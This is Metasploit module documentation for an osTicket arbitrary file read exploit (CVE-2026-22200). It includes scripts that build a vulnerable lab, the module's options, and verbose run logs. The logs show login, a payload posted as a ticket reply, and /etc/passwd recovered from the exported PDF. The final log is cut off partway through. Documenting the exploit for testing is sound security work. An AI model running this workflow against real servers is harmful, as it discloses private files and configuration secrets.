## Vulnerable Application

Enhancesoft osTicket is a widely-used open-source support ticket system.
This module exploits an arbitrary file read vulnerability (CVE-2026-22200), which affects Enhancesoft osTicket versions 1.18.x prior to 1.18.3 and 1.17.x prior to 1.17.7. In vulnerable deployments, this issue can often be triggered by unauthenticated or guest users when ticket self-service is enabled; however, the Metasploit module itself currently uses an authenticated workflow and requires valid osTicket credentials.
​
This vulnerability arises due to improper sanitization of PHP filter expressions within rich-text HTML ticket submissions before they are processed by the mPDF PDF generator during export.

To exploit this vulnerability, an attacker submits a ticket containing malicious payload syntax (such as `php://` or `phar://` bypasses like `php:\\` or `./php://`). When the ticket is subsequently exported to PDF, the mPDF library reads the targeted local file and embeds its contents within the generated PDF as a bitmap image. This allows remote attackers to disclose sensitive local files, such as `/etc/passwd` or `include/ost-config.php`, in the context of the osTicket web application user.

In real-world deployments, this issue may be exploitable in default configurations where guests may create tickets and access ticket status, or where self-registration is enabled. The provided Metasploit module, however, models an authenticated scenario and assumes you have working staff or admin credentials with permission to create and export tickets to PDF

## Installation

### Using any Ubuntu VM (Recommended Way)

1. OsTicket can be installed with the given script on any Ubuntu VM:

```bash
#!/bin/bash

set -e  # Exit on error

# Colors for verbose output
GREEN='\033[0;32m'
BLUE='\033[0;34m'
RED='\033[0;31m'
NC='\033[0m' # No Color

log() {
    echo -e "${BLUE}[+] $1${NC}"
}

success() {
    echo -e "${GREEN}[OK] $1${NC}"
}

error() {
    echo -e "${RED}[ERROR] $1${NC}"
    exit 1
}

DB_NAME="osticket_db"
DB_USER="osticket_user"
DB_PASS="P@ssw0rd123!"  # Change this if needed
INSTALL_DIR="/var/www/html/osticket"
OSTICKET_VER="v1.18.1"

DOWNLOAD_URL="https://github.com/osTicket/osTicket/releases/download/${OSTICKET_VER}/osTicket-${OSTICKET_VER}.zip"


if [ "$EUID" -ne 0 ]; then 
    error "Please run as root (sudo ./setup_osticket_cve_env.sh)"
fi


log "Updating system packages..."
apt-get update -q

log "Installing dependencies (software-properties-common, git, unzip, curl)..."
apt-get install -y software-properties-common git unzip curl


log "Adding ondrej/php repository to ensure PHP 8.2 availability..."
add-apt-repository -y ppa:ondrej/php
apt-get update -q


log "Installing Apache, MariaDB, and PHP 8.2 extensions..."

apt-get install -y \
    apache2 \
    mariadb-server \
    php8.2 \
    php8.2-mysql \
    php8.2-mbstring \
    php8.2-gd \
    php8.2-intl \
    php8.2-apcu \
    php8.2-xml \
    php8.2-curl \
    php8.2-zip \
    php8.2-imap \
    php8.2-bcmath \
    libapache2-mod-php8.2

success "LAMP stack installed."


log "Configuring MySQL/MariaDB..."
service mysql start


mysql -u root -e "CREATE DATABASE IF NOT EXISTS ${DB_NAME};"
mysql -u root -e "CREATE USER IF NOT EXISTS '${DB_USER}'@'localhost' IDENTIFIED BY '${DB_PASS}';"
mysql -u root -e "GRANT ALL PRIVILEGES ON ${DB_NAME}.* TO '${DB_USER}'@'localhost';"
mysql -u root -e "FLUSH PRIVILEGES;"

success "Database '${DB_NAME}' created with user '${DB_USER}'."


log "Downloading osTicket ${OSTICKET_VER}..."
mkdir -p /tmp/osticket_install
wget -O /tmp/osticket_install/osticket.zip "${DOWNLOAD_URL}"

if [ ! -f /tmp/osticket_install/osticket.zip ]; then
    error "Download failed. Check internet connection or URL."
fi

log "Cleaning up old installations..."
rm -rf ${INSTALL_DIR}
mkdir -p ${INSTALL_DIR}

log "Extracting files..."
unzip -q /tmp/osticket_install/osticket.zip -d /tmp/osticket_install/

cp -r /tmp/osticket_install/upload/* ${INSTALL_DIR}/


log "Preparing configuration file..."
cd ${INSTALL_DIR}/include
if [ -f ost-sampleconfig.php ]; then
    cp ost-sampleconfig.php ost-config.php
else
    error "ost-sampleconfig.php not found! Extraction might have failed."
fi


chmod 0666 ost-config.php


log "Configuring Apache Virtual Host..."

CONF_FILE="/etc/apache2/sites-available/osticket.conf"

cat > ${CONF_FILE} <<EOF
<VirtualHost *:80>
    ServerAdmin admin@localhost
    DocumentRoot ${INSTALL_DIR}

    <Directory ${INSTALL_DIR}>
        Options Indexes FollowSymLinks MultiViews
        AllowOverride All
        Require all granted
    </Directory>

    ErrorLog \${APACHE_LOG_DIR}/error.log
    CustomLog \${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
EOF


a2dissite 000-default.conf
a2ensite osticket.conf
a2enmod rewrite


chown -R www-data:www-data ${INSTALL_DIR}
chmod -R 755 ${INSTALL_DIR}

chmod 0666 ${INSTALL_DIR}/include/ost-config.php

log "Restarting Apache..."
service apache2 restart


rm -rf /tmp/osticket_install


IP_ADDR=$(hostname -I | cut -d' ' -f1)

echo "================================================================="
echo -e "${GREEN} INSTALLATION COMPLETE ${NC}"
echo "================================================================="
echo -e "Target: osTicket ${OSTICKET_VER} (Vulnerable to CVE-2026-22200)"
echo -e "Access the setup wizard at: ${BLUE}http://${IP_ADDR}/setup/${NC}"
echo "-----------------------------------------------------------------"
echo "Database Details for the Wizard:"
echo -e "MySQL Database: ${BLUE}${DB_NAME}${NC}"
echo -e "MySQL Username: ${BLUE}${DB_USER}${NC}"
echo -e "MySQL Password: ${BLUE}${DB_PASS}${NC}"
echo "-----------------------------------------------------------------"
echo "Setup Instructions:"
echo "1. Open the URL above in your browser."
echo "2. Ensure all prerequisites show a green checkmark."
echo "3. Fill in the 'System Settings' (use any admin info)."
echo "4. Fill in the 'Database Settings' using the credentials above."
echo "5. Click 'Install Now'."
echo "================================================================="
```

2. After installation and creation of the database, one final step is required to complete osTicket installation and that must be done through the browser. Navigate to your osTicket URL (e.g., `http://localhost/support`) to access the "Basic Installation" screen. You will need to fill out three main sections to finalize the setup:

   **System Settings**
   This section defines the basic identity of your helpdesk:
   - **Helpdesk Name:** The title of your support site (e.g., "IT Support" or "Customer Helpdesk").
   - **Default Email:** The primary email address from which the system will send outgoing notifications.

   **Admin User**
   This section creates the master administrator account for the osTicket backend:
   - **First Name & Last Name:** The administrator's real name.
   - **Email Address:** The administrator's email address (used for password resets and system alerts). Must be different from **Default Email** mentioned above.
   - **Username:** The login username for the admin panel.
   - **Password & Retype Password:** The password for the admin account.

   **Database Settings**
   This section connects the application to your pre-configured MySQL/MariaDB database:
   - **MySQL Table Prefix:** Typically left as the default `ost_` unless you are sharing the database with other applications.
   - **MySQL Hostname:** The address of your database server (usually `localhost` or `127.0.0.1` if hosted on the same machine).
   - **MySQL Database:** The name of the blank database you created prior to running the installer (e.g., `osticket_db`).
   - **MySQL Username:** The database user with privileges to read, write, and modify the database (e.g., `osticket_user` or a dedicated user).
   - **MySQL Password:** The password for the MySQL user. We are using `P@ssw0rd123!` in the above script.

   Once these fields are filled out, click **"Install Now"** to populate the database and complete the installation. *(Note: Ensure that the `include/ost-sampleconfig.php` file has been copied, renamed to `include/ost-config.php`, and has write permissions enabled before clicking install)*.

3. After installation is completed. Sign up and create a user. This user will need to verify itself using a magic link. Since we are not setting up any mail server, we have to login with the administrator user, reset their password from `/scp/users.php` to activate the user account.

4. Create a new ticket and note down the ticket number (It will have a number like: `#527686`)


### Using Docker

OsTicket does not ship their official docker so have a monolithic setup is the best way to install it. 

1. Use the following Dockerfile to setup:

```Dockerfile
FROM ubuntu:22.04

ENV DEBIAN_FRONTEND=noninteractive

ENV DB_NAME="osticket_db" \
    DB_USER="osticket_user" \
    DB_PASS="P@ssw0rd123!" \
    INSTALL_DIR="/var/www/html/osticket" \
    OSTICKET_VER="v1.18.1"

RUN apt-get update -q && apt-get install -y \
    software-properties-common \
    git \
    unzip \
    curl \
    wget \
    nano \
    && rm -rf /var/lib/apt/lists/*

RUN add-apt-repository -y ppa:ondrej/php && apt-get update -q

RUN apt-get install -y \
    apache2 \
    mariadb-server \
    php8.2 \
    php8.2-mysql \
    php8.2-mbstring \
    php8.2-gd \
    php8.2-intl \
    php8.2-apcu \
    php8.2-xml \
    php8.2-curl \
    php8.2-zip \
    php8.2-imap \
    php8.2-bcmath \
    libapache2-mod-php8.2 \
    && rm -rf /var/lib/apt/lists/*

RUN service mariadb start && \
    sleep 3 && \
    mysql -u root -e "CREATE DATABASE IF NOT EXISTS ${DB_NAME};" && \
    mysql -u root -e "CREATE USER IF NOT EXISTS '${DB_USER}'@'localhost' IDENTIFIED BY '${DB_PASS}';" && \
    mysql -u root -e "GRANT ALL PRIVILEGES ON ${DB_NAME}.* TO '${DB_USER}'@'localhost';" && \
    mysql -u root -e "FLUSH PRIVILEGES;"


RUN mkdir -p /tmp/osticket_install && \
    wget -O /tmp/osticket_install/osticket.zip "https://github.com/osTicket/osTicket/releases/download/${OSTICKET_VER}/osTicket-${OSTICKET_VER}.zip" && \
    rm -rf ${INSTALL_DIR} && \
    mkdir -p ${INSTALL_DIR} && \
    unzip -q /tmp/osticket_install/osticket.zip -d /tmp/osticket_install/ && \
    cp -r /tmp/osticket_install/upload/* ${INSTALL_DIR}/

RUN cp ${INSTALL_DIR}/include/ost-sampleconfig.php ${INSTALL_DIR}/include/ost-config.php

RUN sed -i "s/error_reporting(E_ALL & ~E_NOTICE);/error_reporting(E_ALL \& ~E_NOTICE \& ~E_DEPRECATED \& ~E_WARNING);/" ${INSTALL_DIR}/bootstrap.php

RUN echo "<VirtualHost *:80>\n\
    ServerAdmin admin@localhost\n\
    DocumentRoot ${INSTALL_DIR}\n\
    <Directory ${INSTALL_DIR}>\n\
        Options Indexes FollowSymLinks MultiViews\n\
        AllowOverride All\n\
        Require all granted\n\
    </Directory>\n\
    ErrorLog \${APACHE_LOG_DIR}/error.log\n\
    CustomLog \${APACHE_LOG_DIR}/access.log combined\n\
</VirtualHost>" > /etc/apache2/sites-available/osticket.conf

RUN a2dissite 000-default.conf && \
    a2ensite osticket.conf && \
    a2enmod rewrite && \
    chown -R www-data:www-data ${INSTALL_DIR} && \
    chmod -R 755 ${INSTALL_DIR} && \
    chmod 0666 ${INSTALL_DIR}/include/ost-config.php

RUN rm -rf /tmp/osticket_install

RUN echo '#!/bin/bash\n\
# Start MariaDB service\n\
service mariadb start\n\
# Wait for DB to be fully ready\n\
sleep 2\n\
# Start Apache in the foreground to keep the container alive\n\
source /etc/apache2/envvars\n\
exec apache2 -D FOREGROUND\n\
' > /usr/local/bin/entrypoint.sh && chmod +x /usr/local/bin/entrypoint.sh

EXPOSE 80

CMD ["/usr/local/bin/entrypoint.sh"]
```

2. Build and run with the following commands:
```bash
docker build -t osticket-cve-env .
docker run -d -p 8080:80 --name osticket_vuln_server osticket-cve-env
```

2. After installation and creation of the database, one final step is required to complete osTicket installation and that must be done through the browser. Navigate to your osTicket URL (e.g., `http://localhost:8080/support`) to access the "Basic Installation" screen. You will need to fill out three main sections to finalize the setup:

   **System Settings**
   This section defines the basic identity of your helpdesk:
   - **Helpdesk Name:** The title of your support site (e.g., "IT Support" or "Customer Helpdesk").
   - **Default Email:** The primary email address from which the system will send outgoing notifications.

   **Admin User**
   This section creates the master administrator account for the osTicket backend:
   - **First Name & Last Name:** The administrator's real name.
   - **Email Address:** The administrator's email address (used for password resets and system alerts). Must be different from **Default Email** mentioned above.
   - **Username:** The login username for the admin panel.
   - **Password & Retype Password:** The password for the admin account.

   **Database Settings**
   This section connects the application to your pre-configured MySQL/MariaDB database:
   - **MySQL Table Prefix:** Typically left as the default `ost_` unless you are sharing the database with other applications.
   - **MySQL Hostname:** The address of your database server (usually `localhost` or `127.0.0.1` if hosted on the same machine).
   - **MySQL Database:** The name of the blank database you created prior to running the installer (e.g., `osticket_db`).
   - **MySQL Username:** The database user with privileges to read, write, and modify the database (e.g., `osticket_user` or a dedicated user).
   - **MySQL Password:** The password for the MySQL user. We are using `P@ssw0rd123!` in the above script.

   Once these fields are filled out, click **"Install Now"** to populate the database and complete the installation. *(Note: Ensure that the `include/ost-sampleconfig.php` file has been copied, renamed to `include/ost-config.php`, and has write permissions enabled before clicking install)*.

3. After installation is completed. Sign up and create a user. This user will need to verify itself using a magic link. Since we are not setting up any mail server, we have to login with the administrator user, reset their password from `/scp/users.php` to activate the user account.

4. Create a new ticket and note down the ticket number (It will have a number like: `#527686`)

## Verification Steps
1. Install OsTicket using either of the steps mentioned above.
2. Start `msfconsole`.
3. Do: `use auxiliary/gather/osticket_arbitrary_file_read`
4. Set the `RHOSTS` and `RPORT` options as necessary
5. Set the `TICKET_NUMBER` with the ticket number gathered from the website. If not set
6. Set the `USERNAME` and `PASSWORD` from the registered user.
7. Set the full file name that you want to fetch in the `FILE`.
8. Do: `run`

## Options

### FILE
The absolute file path of the target file to be retrieved from the osTicket server. By default, this is set to `/etc/passwd`.

### LOGIN_PORTAL
Specifies which osTicket portal to use for authentication. osTicket maintains separate login interfaces for staff/agents (`scp`) and end-users (`client`). Setting this to auto allows the module to automatically determine the correct portal based on the authentication flow or provided credentials.

### MAX_REDIRECTS
The maximum number of HTTP redirects the module will follow while navigating the authentication process and executing the payload. The default is `3`.

### MAX_TICKET_ID
Specifies the upper limit when brute-forcing the internal database ID of a ticket. Since the internal database ID is often required for exploitation but isn't always publicly visible, the module will attempt to brute-force it up to this boundary if `TICKET_ID` is not explicitly provided. The default is `20`.

### TICKET_NUMBER
The public-facing, user-visible ticket number (e.g., `978554`) that the module will target to inject the payload and trigger the vulnerability.

## Scenarios

### With new non-administrator user
```
msf auxiliary(gather/osticket_arbitrary_file_read) > set USERNAME test
USERNAME => test
msf auxiliary(gather/osticket_arbitrary_file_read) > set TICKET_NUMBER 527686
TICKET_NUMBER => 527686
msf auxiliary(gather/osticket_arbitrary_file_read) > set VERBOSE true
VERBOSE => true
msf auxiliary(gather/osticket_arbitrary_file_read) > set RHOSTS http://localhost:8080/
RHOSTS => http://localhost:8080/
msf auxiliary(gather/osticket_arbitrary_file_read) > set PASSWORD administrator
PASSWORD => administrator
msf auxiliary(gather/osticket_arbitrary_file_read) > run
[*] Running module against 127.0.0.1
[*] Running automatic check ("set AutoCheck false" to disable)
[*] is_osticket?: Response code=200, body length=4943
[*] is_osticket?: osTicket signature FOUND in response body
[!] The service is running, but could not be validated. Target appears to be an osTicket installation
[*] Target: 127.0.0.1:8080
[*] File to extract: /etc/passwd
[*] Attempting authentication...
[*] do_login: portal preference=auto, base_uri=/, username=test
[*] do_login: Trying staff panel (/scp/) login...
[*] osticket_login_scp: GET /scp/login.php
[*] osticket_login_scp: GET response code=200, cookies=OSTSESSID=hni5kfvm5hin0dpkvc7suh70dm;
[*] extract_csrf_token: Searching HTML (6504 bytes) for __CSRFToken__
[+] extract_csrf_token: Found token=dc50fdaa52a6f0aefa0adb14af2698ad89c95501
[*] osticket_login_scp: POST /scp/login.php with userid=test
[*] osticket_login_scp: POST response code=200, url=, body contains userid=true
[-] osticket_login_scp: Login FAILED (still see login form)
[*] do_login: Staff panel login failed
[*] do_login: Trying client portal login...
[*] osticket_login_client: GET /login.php
[*] osticket_login_client: GET response code=200, cookies=OSTSESSID=qpo6iptqv75f1cqcderpha1v86;
[*] extract_csrf_token: Searching HTML (5213 bytes) for __CSRFToken__
[+] extract_csrf_token: Found token=111e06bd5a313466a4f550f9d8014ebb8ba90e8e
[*] osticket_login_client: POST /login.php with luser=test
[*] osticket_login_client: POST response code=302, body contains luser=false
[+] osticket_login_client: Login SUCCESS
[+] do_login: Client portal login succeeded, cookies=OSTSESSID=qpo6iptqv75f1cqcderpha1v86;
[+] Authenticated via client portal
[*] Locating ticket...
[*] find_ticket_id: GET /tickets.php (looking for ticket #527686)
[*] find_ticket_id: Using cookies=OSTSESSID=qpo6iptqv75f1cqcderpha1v86;
[*] find_ticket_id: Ticket listing response code=200, body=6856 bytes
[*] find_ticket_id: Body Length:
6856
[+] find_ticket_id: Found ticket ID=2 from listing page
[+] Ticket #527686 has internal ID: 2
[*] Generating PHP filter chain payload...
[*] Payload generated (13646 bytes)
[*] Submitting payload as ticket reply...
[*] submit_ticket_reply: GET /tickets.php?id=2 to fetch CSRF token
[*] submit_ticket_reply: GET response code=200, body=9605 bytes
[*] extract_csrf_token: Searching HTML (9605 bytes) for __CSRFToken__
[+] extract_csrf_token: Found token=f9ae5cdbe887f403e26489ec4fbb2d1d27234797
[*] submit_ticket_reply: Using textarea field 'c89d7750ba2621', payload=13646 bytes
[*] submit_ticket_reply: POST /tickets.php with a=reply, id=2
[*] submit_ticket_reply: POST response code=200, body=24114 bytes
[*] submit_ticket_reply: Success indicators found=true
[+] Reply posted successfully
[*] Downloading ticket PDF...
[*] download_ticket_pdf: Trying PDF export from /tickets.php
[*] download_ticket_pdf: GET /tickets.php?a=print&id=2
[*] download_ticket_pdf: Response code=200, Content-Type=application/pdf, magic="%PDF", size=54270
[+] download_ticket_pdf: Got PDF (54270 bytes)
[+] PDF downloaded (54270 bytes)
[*] Extracting file from PDF...
[*] extract_files_from_pdf: Processing PDF (54270 bytes)
[*] extract_pdf_image_streams: Found image object (139060 bytes decompressed)
[*] extract_pdf_image_streams: Found image object (1239 bytes decompressed)
[*] extract_files_from_pdf: Found 2 image XObject streams
[*] extract_files_from_pdf: Image #0: 139060 bytes, swapped to BGR
[*] extract_files_from_pdf: Image #1: 1239 bytes, swapped to BGR
[*] extract_data_from_bmp_stream: ISO-2022-KR marker found at offset 0 in 1239-byte stream
[*] extract_data_from_bmp_stream: 1235 bytes after marker (nulls stripped)
[*] First 96 bytes of data after marker and null-strip:
[*]   ascii: "root:x:0:0:root:/root:/bin/bash.daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin.bin:x:2:2:bin:/b"
[*]   hex:   72 6f 6f 74 3a 78 3a 30 3a 30 3a 72 6f 6f 74 3a 2f 72 6f 6f 74 3a 2f 62 69 6e 2f 62 61 73 68 0a 64 61 65 6d 6f 6e 3a 78 3a 31 3a 31 3a 64 61 65 6d 6f 6e 3a 2f 75 73 72 2f 73 62 69 6e 3a 2f 75 73 72 2f 73 62 69 6e 2f 6e 6f 6c 6f 67 69 6e 0a 62 69 6e 3a 78 3a 32 3a 32 3a 62 69 6e 3a 2f 62
[*] Data looks like base64? false
[*] Treating as plain (non-base64) - preview:
[*]   ascii: "root:x:0:0:root:/root:/bin/bash.daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin.bin:x:2:2:bin:/b"
[*]   hex:   72 6f 6f 74 3a 78 3a 30 3a 30 3a 72 6f 6f 74 3a 2f 72 6f 6f 74 3a 2f 62 69 6e 2f 62 61 73 68 0a 64 61 65 6d 6f 6e 3a 78 3a 31 3a 31 3a 64 61 65 6d 6f 6e 3a 2f 75 73 72 2f 73 62 69 6e 3a 2f 75 73 72 2f 73 62 69 6e 2f 6e 6f 6c 6f 67 69 6e 0a 62 69 6e 3a 78 3a 32 3a 32 3a 62 69 6e 3a 2f 62
[+] extract_files_from_pdf: Image #1 yielded 1235 bytes of extracted data
[*] extract_files_from_pdf: Fallback - scanning 12 raw streams
[*] extract_files_from_pdf: Total extracted files: 1
[+] Extracted 1235 bytes

======================================================================
EXTRACTED FILE CONTENTS
======================================================================

--- [/etc/passwd] (1235 bytes) ---
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
mysql:
[+] Saved to: /home/tintin/.msf4/loot/20260222194304_default_127.0.0.1_osticket.etc_pas_543896.bin

[+] Exploitation complete
[*] Running module against ::1
[*] Running automatic check ("set AutoCheck false" to disable)
[*] is_osticket?: Response code=200, body length=4943
[*] is_osticket?: osTicket signature FOUND in response body
[!] The service is running, but could not be validated. Target appears to be an osTicket installation
[*] Target: ::1:8080
[*] File to extract: /etc/passwd
[*] Attempting authentication...
[*] do_login: portal preference=auto, base_uri=/, username=test
[*] do_login: Trying staff panel (/scp/) login...
[*] osticket_login_scp: GET /scp/login.php
[*] osticket_login_scp: GET response code=200, cookies=OSTSESSID=s0ksargvidhkv41th0url3m1ua;
[*] extract_csrf_token: Searching HTML (6504 bytes) for __CSRFToken__
[+] extract_csrf_token: Found token=e1a5096cc2f00526a4606567f866ad8fdcf67d22
[*] osticket_login_scp: POST /scp/login.php with userid=test
[*] osticket_login_scp: POST response code=200, url=, body contains userid=true
[-] osticket_login_scp: Login FAILED (still see login form)
[*] do_login: Staff panel login failed
[*] do_login: Trying client portal login...
[*] osticket_login_client: GET /login.php
[*] osticket_login_client: GET response code=200, cookies=OSTSESSID=1ldkhkadfl2rqur16lnf4ru5od;
[*] extract_csrf_token: Searching HTML (5213 bytes) for __CSRFToken__
[+] extract_csrf_token: Found token=aa3f025a7693418fa66d8691f39bc60d28ed0791
[*] osticket_login_client: POST /login.php with luser=test
[*] osticket_login_client: POST response code=302, body contains luser=false
[+] osticket_login_client: Login SUCCESS
[+] do_login: Client portal login succeeded, cookies=OSTSESSID=1ldkhkadfl2rqur16lnf4ru5od;
[+] Authenticated via client portal
[*] Locating ticket...
[*] find_ticket_id: GET /tickets.php (looking for ticket #527686)
[*] find_ticket_id: Using cookies=OSTSESSID=1ldkhkadfl2rqur16lnf4ru5od;
[*] find_ticket_id: Ticket listing response code=200, body=6856 bytes
[*] find_ticket_id: Body Length:
6856
[+] find_ticket_id: Found ticket ID=2 from listing page
[+] Ticket #527686 has internal ID: 2
[*] Generating PHP filter chain payload...
[*] Payload generated (13646 bytes)
[*] Submitting payload as ticket reply...
[*] submit_ticket_reply: GET /tickets.php?id=2 to fetch CSRF token
[*] submit_ticket_reply: GET response code=200, body=23979 bytes
[*] extract_csrf_token: Searching HTML (23979 bytes) for __CSRFToken__
[+] extract_csrf_token: Found token=917409710733c0ab9c26758c5e4096531ded2441
[*] submit_ticket_reply: Using textarea field '70211e92acc5d1', payload=13646 bytes
[*] submit_ticket_reply: POST /tickets.php with a=reply, id=2
[*] submit_ticket_reply: POST response code=200, body=38488 bytes
[*] submit_ticket_reply: Success indicators found=true
[+] Reply posted successfully
[*] Downloading ticket PDF...
[*] download_ticket_pdf: Trying PDF export from /tickets.php
[*] download_ticket_pdf: GET /tickets.php?a=print&id=2
[*] download_ticket_pdf: Response code=200, Content-Type=application/pdf, magic="%PDF", size=54429
[+] download_ticket_pdf: Got PDF (54429 bytes)
[+] PDF downloaded (54429 bytes)
[*] Extracting file from PDF...
[*] extract_files_from_pdf: Processing PDF (54429 bytes)
[*] extract_pdf_image_streams: Found image object (139060 bytes decompressed)
[*] extract_pdf_image_streams: Found image object (1239 bytes decompressed)
[*] extract_files_from_pdf: Found 2 image XObject streams
[*] extract_files_from_pdf: Image #0: 139060 bytes, swapped to BGR
[*] extract_files_from_pdf: Image #1: 1239 bytes, swapped to BGR
[*] extract_data_from_bmp_stream: ISO-2022-KR marker found at offset 0 in 1239-byte stream
[*] extract_data_from_bmp_stream: 1235 bytes after marker (nulls stripped)
[*] First 96 bytes of data after marker and null-strip:
[*]   ascii: "root:x:0:0:root:/root:/bin/bash.daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin.bin:x:2:2:bin:/b"
[*]   hex:   72 6f 6f 74 3a 78 3a 30 3a 30 3a 72 6f 6f 74 3a 2f 72 6f 6f 74 3a 2f 62 69 6e 2f 62 61 73 68 0a 64 61 65 6d 6f 6e 3a 78 3a 31 3a 31 3a 64 61 65 6d 6f 6e 3a 2f 75 73 72 2f 73 62 69 6e 3a 2f 75 73 72 2f 73 62 69 6e 2f 6e 6f 6c 6f 67 69 6e 0a 62 69 6e 3a 78 3a 32 3a 32 3a 62 69 6e 3a 2f 62
[*] Data looks like base64? false
[*] Treating as plain (non-base64) - preview:
[*]   ascii: "root:x:0:0:root:/root:/bin/bash.daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin.bin:x:2:2:bin:/b"
[*]   hex:   72 6f 6f 74 3a 78 3a 30 3a 30 3a 72 6f 6f 74 3a 2f 72 6f 6f 74 3a 2f 62 69 6e 2f 62 61 73 68 0a 64 61 65 6d 6f 6e 3a 78 3a 31 3a 31 3a 64 61 65 6d 6f 6e 3a 2f 75 73 72 2f 73 62 69 6e 3a 2f 75 73 72 2f 73 62 69 6e 2f 6e 6f 6c 6f 67 69 6e 0a 62 69 6e 3a 78 3a 32 3a 32 3a 62 69 6e 3a 2f 62
[+] extract_files_from_pdf: Image #1 yielded 1235 bytes of extracted data
[*] extract_files_from_pdf: Fallback - scanning 12 raw streams
[*] extract_files_from_pdf: Total extracted files: 1
[+] Extracted 1235 bytes

======================================================================
EXTRACTED FILE CONTENTS
======================================================================

--- [/etc/passwd] (1235 bytes) ---
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
mysql:
[+] Saved to: /home/tintin/.msf4/loot/20260222194305_default_1_osticket.etc_pas_161216.bin

[+] Exploitation complete
[*] Auxiliary module execution completed
```


### With Administrator user 
```
msf auxiliary(gather/osticket_arbitrary_file_read) > set USERNAME administrator
USERNAME => administrator
msf auxiliary(gather/osticket_arbitrary_file_read) > set TICKET_NUMBER 527686
TICKET_NUMBER => 527686
msf auxiliary(gather/osticket_arbitrary_file_read) > set VERBOSE true
VERBOSE => true
msf auxiliary(gather/osticket_arbitrary_file_read) > set RHOSTS http://localhost:8080/
RHOSTS => http://localhost:8080/
msf auxiliary(gather/osticket_arbitrary_file_read) > set PASSWORD administrator
PASSWORD => administrator
msf auxiliary(gather/osticket_arbitrary_file_read) > run
[*] Running module against 127.0.0.1
[*] Running automatic check ("set AutoCheck false" to disable)
[*] is_osticket?: Response code=200, body length=4943
[*] is_osticket?: osTicket signature FOUND in response body
[!] The service is running, but could not be validated. Target appears to be an osTicket installation
[*] Target: 127.0.0.1:8080
[*] File to extract: /etc/passwd
[*] Attempting authentication...
[*] do_login: portal preference=auto, base_uri=/, username=administrator
[*] do_login: Trying staff panel (/scp/) login...
[*] osticket_login_scp: GET /scp/login.php
[*] osticket_login_scp: GET response code=200, cookies=OSTSESSID=1in45o31u3itsmsr3u5848gr83;
[*] extract_csrf_token: Searching HTML (6504 bytes) for __CSRFToken__
[+] extract_csrf_token: Found token=f467a6da2cdee133ab691be6cc479ad9909824b0
[*] osticket_login_scp: POST /scp/login.php with userid=administrator
[*] osticket_login_scp: POST response code=302, url=index.php, body contains userid=false
[+] osticket_login_scp: Login SUCCESS
[+] do_login: SCP login succeeded, cookies=OSTSESSID=1in45o31u3itsmsr3u5848gr83;
[+] Authenticated via scp portal
[*] Locating ticket...
[*] find_ticket_id: GET /scp/tickets.php (looking for ticket #527686)
[*] find_ticket_id: Using cookies=OSTSESSID=1in45o31u3itsmsr3u5848gr83;
[*] find_ticket_id: Ticket listing response code=200, body=23649 bytes
[*] find_ticket_id: Body Length:
23649
[+] find_ticket_id: Found ticket ID=1 from listing page
[+] Ticket #527686 has internal ID: 1
[*] Generating PHP filter chain payload...
[*] Payload generated (13646 bytes)
[*] Submitting payload as ticket reply...
[*] acquire_lock_code: POST /scp/ajax.php/lock/ticket/1
[+] acquire_lock_code: Got lock code from JSON response
[*] submit_ticket_reply: GET /scp/tickets.php?id=1 to fetch CSRF token
[*] submit_ticket_reply: GET response code=200, body=57517 bytes
[*] extract_csrf_token: Searching HTML (57517 bytes) for __CSRFToken__
